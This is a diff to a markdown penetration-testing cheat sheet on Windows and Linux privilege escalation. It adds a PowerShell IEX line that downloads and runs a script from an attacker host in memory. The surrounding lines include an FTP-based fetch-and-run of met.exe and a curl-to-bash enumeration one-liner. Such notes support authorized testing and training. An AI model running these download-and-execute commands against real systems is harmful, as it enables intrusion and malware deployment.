@@ -24,6 +24,8 @@
 * `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_
 * `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
 * [Next Gen Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
+* [Windows enumeration script](https://github.com/411Hall/JAWS)
+* `IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1)` _Download and exec a powershell script in memory_
 
 ## Priv Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
